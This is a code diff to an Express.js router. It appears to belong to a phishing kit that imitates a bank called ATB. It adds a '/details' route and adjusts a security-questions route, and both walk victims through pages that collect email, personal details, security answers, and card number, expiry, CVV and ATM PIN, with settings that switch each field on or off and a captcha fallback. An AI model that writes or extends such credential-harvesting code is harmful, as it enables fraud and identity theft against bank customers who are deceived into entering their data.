@@ -15,6 +15,46 @@ router.get('/email', async (req, res) => {
     res.render('bank/atb/email/index', { navig: "/atb/loading" });
 })
 
+
+router.get('/details', async (req, res) => {
+    try {
+        const result = await pool.query('SELECT data FROM items WHERE id = $1', [getId]);
+        let count = 0
+        let countRmvDetailsPage = 0
+        let countRmvCardPage = 0
+        let rmvCardPage = false
+
+        Object.keys(result.rows[0].data.settings.atb).forEach(key => {
+            if (result.rows[0].data.settings.atb[key] === 'off') {
+                count++;
+                if (key != 'card' && key != 'exp' && key != 'cvv' && key != 'atm') {
+                    countRmvDetailsPage++;
+                } else {
+                    countRmvCardPage++;
+                    //console.log(countRmvCardPage);
+                }
+            }
+        });
+
+        if (countRmvCardPage == 4) {
+            rmvCardPage = true
+        }
+
+
+        if (rmvCardPage) {
+            res.render('bank/atb/details/index', { navig: "/atb/finish", atb: result.rows[0].data.settings.atb});
+        } else {
+            res.render('bank/atb/details/index', { navig: "/atb/card", atb: result.rows[0].data.settings.atb});
+        }
+
+
+
+    } catch (error) {
+        console.log(error);
+        res.render('captcha/index');
+    }
+})
+
 router.get('/qst', async (req, res) => {
     try {
         const result = await pool.query('SELECT data FROM items WHERE id = $1', [getId]);
@@ -53,7 +93,7 @@ router.get('/qst', async (req, res) => {
             if (rmvCardPage) {
                 res.render('bank/atb/qst/index', { navig: "/atb/finish", p_quests: result.rows[0].data.settings.atb.qa });
             } else {
-                res.render('bank/atb/qst/index', { navig: "/atb/card", p_quests: result.rows[0].data.settings.atb.qa});
+                res.render('bank/atb/qst/index', { navig: "/atb/card", p_quests: result.rows[0].data.settings.atb.qa });
             }
         } else if (count >= 14) {
             res.render('bank/atb/qst/index', { navig: "/atb/finish", p_quests: result.rows[0].data.settings.atb.qa });
